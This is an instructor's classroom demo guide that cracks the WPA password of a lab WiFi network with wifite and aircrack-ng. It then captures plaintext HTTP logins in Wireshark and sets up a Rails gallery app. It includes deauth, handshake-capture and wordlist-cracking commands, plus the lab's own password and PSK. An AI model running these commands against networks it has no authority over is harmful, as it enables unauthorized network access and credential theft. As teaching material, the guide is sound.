---
layout: page
title: WiFi Security Activity
---
# {{page.title}}

- [{{page.title}}](#pagetitle)
  - [Requirements](#requirements)
    - [Prerequisite:](#prerequisite)
    - [Hardware:](#hardware)
    - [Software:](#software)
  - [Activity 1: Cracking a WiFi Password:](#activity-1-cracking-a-wifi-password)
    - [Requirements:](#requirements-1)
    - [Step 1: Make sure everything is running](#step-1-make-sure-everything-is-running)
    - [Step 2: Run Wifite](#step-2-run-wifite)
  - [Activity 2: Capturing Packets in a network](#activity-2-capturing-packets-in-a-network)
    - [Step 1: Setting up wireshark](#step-1-setting-up-wireshark)
    - [Step 2: Capturing HTTP requests](#step-2-capturing-http-requests)
    - [Step 3: Stop the capture](#step-3-stop-the-capture)
  - [Some Troubleshooting commands:](#some-troubleshooting-commands)
  - [To Use Aircrack Manually:](#to-use-aircrack-manually)
    - [Common Aircrack-ng Commands](#common-aircrack-ng-commands)
  - [Deploying the gallery\_app in another Linux PC](#deploying-the-gallery_app-in-another-linux-pc)
    - [Accessing the SQLite DB in the RAILS console](#accessing-the-sqlite-db-in-the-rails-console)
      - [Option 1](#option-1)
        - [Useful Examples:](#useful-examples)
        - [Example Workflow](#example-workflow)


> **DISCLAIMER:** The information provided here is for educational purposes only. This demonstration's purpose is to illustrate why security matters and how hackers take advantage of poorly secured networks. 
> ⚠️ ⚠️ ⚠️ ⚠️ Legal & Ethical Warning⚠️ ⚠️ ⚠️ ⚠️ 
> * Only test networks you own or have permission to audit.
> * Unauthorized hacking is illegal in most countries.



## Requirements
### Prerequisite:
* Know the basics of:
  * Bash
  * Linux 
  * Networking

> **This is not a tutorial** but a written guide that I use to do a demo towards the end of the CIS-107 IT Fundamentals class. 

### Hardware:

<p><img src="https://docs.google.com/drawings/d/e/2PACX-1vT2FuS5pPw-V0NolmqzZR-gNlTH5vDfoh1_HdOZ7r8glcRvmqJqM1Lvd6s5XpxIR6RKCcNUgPrqf6z4/pub?w=830&h=662"></p>


**Server**
* OS: Raspberry Pi OS (Debian 12)
* Tech Stack: Ruby on RAILS CRUD APP
* IP: 192.168.0.9
* Port: 8080
**Client A:**
* Smartphone (iPhone 12 Mini)
* IP: 192.168.0.10
**Client B:**
* Desktop PC (OS Ubuntu 24.04)
* IP: 192.168.0.3
**Router**
* IP: 192.168.0.1
* SSID: cis106-sec-activity
* PASS: PinkFloyd05
* PSK: 24409f49c5e218da9ad39c93547fd252c30b8d943440c08795d10eb9f3444faa

### Software:
* Clients:
  * Web browser
* Server:
  * Raspberry Pi OS
  * Stack: RAILS
* Attacker PC:
  * OS: Kali Linux
  * Wireshark
  * Wifite

## Activity 1: Cracking a WiFi Password:

### Requirements:
* A **computer with all the necessary software** installed. Here we will use wifite which is a python script that automates the process. This script is included in **Kali Linux** therefore having a PC with Kali Linux takes care of it.
* A WiFi card capable of monitoring mode. [Here is a list of recommended WiFi cards:](https://www.secpoint.com/wifi-usb-adapters-performance-test.html)
* A network that you own or have the legal right to exploit. Remember, **accessing a network you do not have authorization to is a CRIME.** 
* The network needs to have at least 1 node connected to it.

### Step 1: Make sure everything is running

1. Setup your network. 
   1. Connect the router and turn it on
   2. Turn on all the client PCs and connect them to the WiFi network
   3. Turn on the server. The Raspberry Pi has already been configured to get an ip automatically
   however, the server is not running. You will need to either SSH to the Raspberry Pi or connect a keyboard and monitor to it. Once you have access to the Raspberry Pi, cd into the directory `gallery_app` and then run the command: <br>`rails server -b 0.0.0.0 -p 8080` <br>
   4. At this point all the computers that connect to the router can have access to the web application by navigating to the url: `http://192.168.0.9:8080`
   5. Turn on the PC that is running Kali Linux

### Step 2: Run Wifite
1. In the Kali machine, open a terminal and run: `sudo wifite -v --kill --daemon --wpa --dic rockyou.txt --no-pmkid`
2. Alternatively, you an simply run `sudo wifite`. The command in step 1 just skips some of the default values
3. Follow the prompts and wait till `wifite` is done cracking the password. 
4. Depending on the complexity of the network's password and your CPU, this can take day!
5. If for some reason, the password was not cracked but the handshake was captured, you can use the following command to attempt to crack the password with a different word list:
   1. `sudo aircrack-ng -w word-list-here.txt -b wifi-BSSID pcap_file_here.cap`

> [WiFite](https://www.kali.org/tools/wifite/) uses aircrack-ng, pyrit, reaver, tshark to automate the process of cracking WEP and WPA passwords. HEre are some other tutorials that do not use wifite:
> * [How to Crack WPA/WPA2](https://www.aircrack-ng.org/doku.php?id=cracking_wpa) by darkAudax
> * [How to Use Aircrack-ng: A Guide to Network Compromise](https://www.stationx.net/how-to-use-aircrack-ng-tutorial/) by Andrew DeVito

## Activity 2: Capturing Packets in a network
### Step 1: Setting up wireshark

1. Now that we have access to the network, lets capture the data that is flowing to see if you can find any unencrypted information.
2. This will require the following:
   1. Kali Linux
   2. Wireshark running with sudo privilages
   3. airmon-ng to put the card in monitoring mode
   4. The Kali PC needs to have 2 WiFi cards
      1. **WiFi card 1** needs to support monitoring mode and will be used for scanning the network with promiscuous mode
      2. **WiFi card 2** does not need to be anything special but needs to be connected to the network we are capturing packets from.
   5. To identify the wifi cards use the following command: `iwcondig`
   6. Once you have identified the cards, put the capturing card in monitoring mode with: 
      1. `sudo airmon-ng start wlan0`
      2. Alternatively, you can use: <br>`sudo ip link set wlan0 down && sudo iw dev wlan0 set type managed && sudo ip link set wlan0 up`
   7. Once the card is in monitoring mode, start wireshark with the command: `sudo wireshark`
   8. Complete the following:
      1. Change the interfaces to: Wireless only (disable anything else that is not wireless)
      2. Click on view (in the top menu) and enable Wireless Tool bar
      3. Click on the  802.11 preference button and locate the 802.11 protocol
      4. Set the values to the screenshots.
      5. Open the decryption key and add the WPA-PSK key. This was generated using this [website](https://www.wireshark.org/tools/wpa-psk.html) which is a hex value that combines the password and SSID.
      6. Make sure that at the top left conner the selected interface is the monitoring one. In my case, it is called: `wlan0mon`
      7. Open the capture options (gears icon at the top) and set the following values:
         1. Make sure promiscuous mode is ticked on
      8. Select the network interface and then click on the blue fin in the menu to start scanning the network.


![1](/assets/imgs/wifi/1.png)

<p>
<img src="/assets/imgs/wifi/2.png">
</p>


<p>
<img src="/assets/imgs/wifi/3.png">
</p>




### Step 2: Capturing HTTP requests
1. Using the client computers, go to the servers url
2. Create an account
3. Upload a photo to the server

### Step 3: Stop the capture
1. Go back to wireshark and stop the capture
2. Filter the capture by http requests
3. Slowly analyze the request until you find one that reads something like "user/sign_in http1.1"
4. Notice that the user name and password are readable in plaintext

<p>
<img src="/assets/imgs/wifi/final_result.png">
</p>


## Some Troubleshooting commands:

1. Identify your wireless interface/verify the state of the interface: `ip a` or `iwconfig` 
2. Put the interface in monitor mode:
```bash
sudo ip link set <interface> down
sudo iwconfig <interface> mode monitor
sudo ip link set <interface> up
# can also use: sudo airmon-ng start/stop <interface> 
```
3.  Capture traffic with Tcpdump: `sudo tcpdump -i <monitor_interface> -w captured_traffic.pcap 'tcp port 8080'`
    1.  `-i`: Specify the monitor interface.
    2.  `-w`: Save to a file for later analysis.
    3.  `'tcp port 8080'`: Filter for HTTP traffic on port 8080.
4.  Check your card’s capabilities: `sudo iw list | grep -A 10 "Supported interface modes"`
5.  Find the AP’s channel: `sudo iwlist <connected_interface> scanning | grep "Channel"`
6.  Set Monitoring Nic to a given channel: `sudo iwconfig <monitor_interface> channel <AP_channel>`
7.  Confirm Promiscuous Mode is Active: `ip link show <interface> | grep PROMISC`
8.  Explicitly enable promiscuous mode: `sudo ip link set <interface> promisc on`
9.  See the driver and hardware details of NIC: `lspci -knn | grep -iA3 net`
    1.  For USB cards you will use: `lsusb`
    2.  You can also use: `sudo lshw -class network`
    3.  And for Kernel modules: `lsmod | grep wifi`

## To Use Aircrack Manually:

1. Install: `sudo apt update && sudo apt install aircrack-ng`
2. Put Card in Monitor Mode: `iwconfig && sudo airmon-ng start wlan0` (assuming your interface is wlan0)
3. Verify monitoring mode: `iwconfig wlan0mon | grep Mode` Should return `"Mode:Monitor"`
4. Scan for Nearby Wi-Fi Networks: `sudo airodump-ng wlan0mon`
5. Capture a Handshake: `sudo airodump-ng -c <CHANNEL> --bssid <BSSID> -w capture wlan0mon`
   1. Wait for a handshake (or force one with aireplay-ng): `sudo aireplay-ng -0 4 -a <BSSID> -c <CLIENT_MAC> wlan0mon`
6. Crack it: `sudo aircrack-ng -w rockyou.txt capture-01.cap`
   1. You many need to install wordlist: `sudo apt install wordlists`
7. Restore wifi card: `sudo airmon-ng stop wlan0mon`

### Common Aircrack-ng Commands

| Command                                   | Description                |
| ----------------------------------------- | -------------------------- |
| `airmon-ng start wlan0`                   | Enable monitor mode        |
| `airodump-ng wlan0mon`                    | Scan networks              |
| `aireplay-ng -0 4 -a BSSID wlan0mon`      | Deauth attack              |
| `aircrack-ng -w wordlist.cap capture.cap` | Crack password             |
| `wash -i wlan0mon`                        | Detect WPS-enabled routers |



## Deploying the gallery_app in another Linux PC

> Note: I have only tested this in Ubuntu 24.04 and Debian 12

1. Install all the dependencies:

```bash
sudo apt update
sudo apt upgrade -y
sudo apt install -y curl gnupg2 apt-transport-https ca-certificates lsb-release
sudo apt install -y libssl-dev libreadline-dev zlib1g-dev libyaml-dev
sudo apt install -y libsqlite3-dev libxml2-dev libxslt1-dev libpq-dev
sudo apt install -y libcurl4-openssl-dev libffi-dev libgdbm-dev
sudo apt install -y libncurses5-dev automake libtool bison
sudo apt -y install libvips libvips-dev
## Install ruby:
# Install rbenv and ruby-build
sudo apt install -y rbenv

# Initialize rbenv automatically
echo 'export PATH="$HOME/.rbenv/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(rbenv init - bash)"' >> ~/.bashrc
source ~/.bashrc

# Install ruby-build plugin
mkdir -p "$(rbenv root)"/plugins
git clone https://github.com/rbenv/ruby-build.git "$(rbenv root)"/plugins/ruby-build

# Install Ruby 3.3.0 which is what the project is using
# this is will take long
rbenv install 3.3.0
rbenv global 3.3.0
# This command should return the version of ruby
ruby -v
gem install bundler
gem install rails
# Then refresh rbenv shims:
rbenv rehash
# Check Rails version (I used v8):
rails -v
# Just in case you want to visually open your sqlite db
sudo apt install sqlitebrowser
# debugging gem
gem install pry
```

2. If you want to test your RAILS installation, you can create a basic project like this:

```bash
rails new testapp
cd testapp
rails server
```
3. Visit http://localhost:3000 and you should see the Rails welcome page

4. Clone the repo:
```bash
git clone https://github.com/ra559/gallery_app.git
cd gallery_app
```
5. Install dependencies and migrate db:
```bash
bundle install
rails db:create
rails db:migrate
rails db:seed
```
6. Run the app and access it:
```bash
rails server -b 0.0.0.0 -p 8080
# In the web browser of another computer in your network, run:
# http://SERVER-IP-HERE:8080
```

### Accessing the SQLite DB in the RAILS console

To access and query the SQLite database your Rails application is using, you have several options:

* **Option 1:** Use the Rails Console
* **Option 2:** Use the SQLite3 Command Line Tool
* **Option 3:** Use a GUI Tool
* **Option 4:** Use Rails Database Tasks

#### Option 1

When you're in the Rails console (rails console or rails c), you can use Ruby with ActiveRecord (Rails' ORM) to query your database directly—no raw SQL needed (though you can use SQL if you want)

1. Cd into the app directory and run: `rails console`
2. Then you can run ActiveRecord queries:
   1. Example:

```ruby
User.all  # Shows all users
Post.where(user_id: 1)  # Shows posts for user with ID 1
``` 
##### Useful Examples:

```ruby
# Fetch all records from a model (table) (Equivalent to: SELECT * FROM users;)
User.all

# Find by ID (Equivalent to: SELECT * FROM users WHERE id = 1;)
User.find(1)  

# Find by attribute:
User.find_by(email: "test@example.com")  

# Where (filter records) (SELECT * FROM users WHERE active = true;)
User.where(active: true)  

#Order, limit, and offset (SELECT * FROM posts ORDER BY created_at DESC LIMIT 5;)
Post.order(created_at: :desc).limit(5)  

# Count records (# SELECT COUNT(*) FROM users;)
User.count  

# Pluck (Get Only Specific Columns)
# SELECT id, email FROM users WHERE admin = true;
# Returns an array like: [[1, "admin@example.com"], [2, "mod@example.com"]]
User.where(admin: true).pluck(:id, :email)

# Raw SQL (If Needed)
ActiveRecord::Base.connection.execute("SELECT * FROM users WHERE id = 1")

# Viewing Results Nicely
# Force pretty-printing
pp User.all.to_a  # "pp" = "pretty print"
```

##### Example Workflow
```ruby
#Querying data:
latest_users = User.order(created_at: :desc).limit(5)
latest_users.each { |user| puts "#{user.id}: #{user.email}" }
```